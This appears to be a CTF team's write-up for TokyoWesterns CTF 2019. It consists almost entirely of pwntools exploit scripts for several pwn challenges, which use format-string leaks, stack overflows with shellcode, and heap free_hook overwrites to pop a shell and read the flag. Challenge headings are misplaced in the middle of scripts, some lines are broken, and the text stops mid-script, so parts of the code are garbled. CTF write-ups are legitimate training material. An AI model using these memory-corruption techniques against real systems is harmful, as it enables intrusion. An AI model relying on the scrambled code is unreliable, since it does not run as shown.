Nu1L TWCTF2019 Writeup
Nu1L Teamhttps://nu1l-ctf.com
Nu1L TWCTF2019 Writeup
Pwn
warmup
printf
Asterisk-Alloc
mi
SecureKarte
Web
j2x2j
PHP Note
Oneline Calc
Reverse
Easy Crack Me
Meow
Holy Grail War
M Poly Cipher
EBC
Crypto
Real Baby RSA
Simple logic
Pwn
warmup
from pwn import *
context(arch='amd64')
p = process('./warm')
p = remote('nothing.chal.ctf.westerns.tokyo', 10001)
p.recvuntil('me :)\n')
p.sendline('%47$llx'.ljust(0x108,'a')+p64(0x400709)+p64(0x4006ba))
addr = int(p.recv(12),16)
print hex(addr)
ree = addr -(0x7ffc2b7b4460-0x0007FFC2B7B4288)+8
p.recvuntil('me :)\n')
sh  = asm(shellcraft.sh())
raw_input()
p.sendline(sh.ljust(0x108,'\x00')+p64(ree))
p.interactive()
printf
from pwn import *
#p = process('./p')
p = remote('printf.chal.ctf.westerns.tokyo', 10001)
elf = ELF('./p')
libc = elf.libc
# gdb.attach(p,"b *"+hex(proc+0x1291))
p.recvuntil('name')
# p.sendline('%llx '*41+"AAAA"+'%llx'*12)
p.send("%lx "*0x40)
p.recvuntil('0 ')
addr = int(p.recv(12),16)
libc.address = addr - 0x1e7580
log.info("libc.address:"+hex(libc.address))
cnt = p.recvuntil("\n",drop=True)
data = cnt.split(" ")
#proc = int(data[37],16)-0x10d0
#log.info("proc:"+hex(proc))
stack = int(data[38],16)
log.info("stack:"+hex(stack))
log.info(hex(stack-0x6d0))
canary = int(data[39],16)
log.info("canary:"+hex(canary))
system = libc.sym['system']
binsh = next(libc.search("/bin/sh\x00"))
p.recvuntil('comment')
init = stack-0x760
log.info("init:"+hex(init))
if init&0xff==0:
    exit(0)
ret = ((init&0xff)+0xd8-0xf-0x7-0x7+0x8)
if ret>0x100:
    exit(0)
Asterisk-Alloc
'''
init = stack-0xa0+0xe0
log.info("init:"+hex(init))
byte1 = init&0xff
byte2 = (init>>8)&0xff
'''
print(hex(ret))
payload = '%lx'*34
payload = payload.ljust(0xb0,'a')
payload += "%s%d"+chr(ret-8)*0xa
payload += "A"*0x5
payload += p64(stack-0x108)
payload = payload.ljust(0xd8,'A')
payload += p64(stack-0x600)
payload += p64(canary)
payload += 'aaaaaaaa'
payload += p64(libc.address+0xe2386)
print hex(stack-0x108)
print hex(len(payload))
p.send(payload)
p.interactive()
from pwn import *
libc = ELF('./libc.so.6')
def malloc(size,data):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.send(data)
def calloc(size,data):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.send(data)
def realloc(size,data):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    if size > 0:
        p.recvuntil('Data: ')
        p.send(data)
def dele(ch):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('Which: ')
    p.sendline(ch)
#p = process('./ast')
while True:
    try:
        p = process('./ast',env={'LD_PRELOAD':'./libc.so.6'})
        calloc(0xa0, '/bin/sh\n')
        realloc(0x1f0, '\n')
        realloc(0xf0, '\n')
        for i in range(6):
            dele('r')
        realloc(0, '')
        a =0x47#int(raw_input("A"),16)
        realloc(0xa0, '\x60'+chr(a))
        sleep(0.5)
        for i in range(8):
            dele('c')
        realloc(0x400, '\n')
        realloc(0x10, '\n')
        realloc(0, '')
        realloc(0xf0, '\n')
        malloc(0xf0,p64(0xfbad3c80)+p64(0)*3+p8(0))#leak
        sleep(0.2)
        p.recv(8)
        addr = u64(p.recv(8))
        libc_base =addr-(0x7fbec5afb8b0-0x7fbec570e000)
        print hex(libc_base)
        realloc(0x80,'\n')
        dele('r')
        dele('r')
        dele('r')
        dele('r')
        dele('r')
        dele('r')
        dele('r')
mi
        realloc(0,'')
realloc(0x130,0xa0*'\x00'+p64(0)+p64(0x30)+p64(libc_base+libc.symbols['__fr
ee_hook']-0x8)+p64(0)*4+p64(0x61)+'\n')
        realloc(0,'')
        realloc(0x80,p64(libc_base+libc.symbols['__free_hook'])+'\n')
        realloc(0,'')
realloc(0x80,"/bin/sh\x00"+p64(libc_base+libc.symbols['system'])+'\n')
        p.recvuntil('choice')
        p.sendline('4')
        p.recvuntil('Which')
        p.sendline('r')
        p.sendline('cat flag')
        p.interactive()
    except:
        p.close()
        continue
from pwn import *
context.arch="amd64"
def add(idx,size):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('number')
    p.sendline(str(idx))
    p.recvuntil('size')
    p.sendline(str(size))
def edit(idx,cont):
    p.recvuntil('>>')   
    p.sendline('2')
    p.recvuntil('number')
    p.sendline(str(idx))
    p.recvuntil('value')
    p.send(cont)
def dele(idx):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil('number')
    p.sendline(str(idx))
while True:
    try:
        p=process("./mi")
        #p=remote("mi.chal.ctf.westerns.tokyo",10001)       
        add(0,0x60)
        add(1,0x60)
        dele(0)
        dele(1)
        p.recvuntil('>>')
        p.sendline('3')
        p.recvuntil('number\n')
        p.sendline('1')
        addr = u64(p.recvline()[:-1].ljust(8,'\x00'))
        print hex(addr)
        base = addr-0x16c0
        mmap_addr = (addr+0x100)&0xffffffffffff0000
        print hex(mmap_addr)
        #a = 0x1022a000
        a = int(raw_input("a"),16)
        libm_addr = mmap_addr + a
        libc_addr = libm_addr + 0x22a000
        edit(1,p64(mmap_addr+0x70)*12)
        for i in range(39):
            add(1,0x60)
        add(2,0x60)
        d_hook = 0x228970
        edit(2,p64(base+0x2628)+p64(libm_addr+d_hook)*11)
        add(1,0x60)
        add(1,0x60)
        one = libc_addr +0x10a38c
        arena = 
(p64(0)*3+p64(one)+p64(0)+p64(base+0x2620)+p64(0x60)).ljust(0x60,'\x00')
        edit(1,arena)       
        add(1,0x60)
        p.recvuntil(">>")
        p.sendline("1")
SecureKarte
        p.recvuntil("number")
        p.sendline('0')
        p.recvuntil('size')
        p.sendline(str(0x50))
        p.sendline("cat flag")
        p.interactive()
    except:
        p.close()
        continue
from pwn import *
def add(size,data):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size >')
    p.sendline(str(size))
    p.recvuntil('description > ')
    p.send(data)
    p.recvuntil('Added id ')
    idx = p.recvuntil('\n')[:-1]
    return int(idx)
def edit(idx,data):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('id >')
    p.sendline(str(idx))
    p.recvuntil('description > ')
    p.send(data)
def dele(idx):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('Input id > ')
    p.sendline(str(idx))
while True:
    try:
        p = remote('karte.chal.ctf.westerns.tokyo', 10001)
        #p = process('./karte')     
        p.recvuntil('name')
        p.sendline('/bin/sh')       
        id0 = add(0x90,'\n')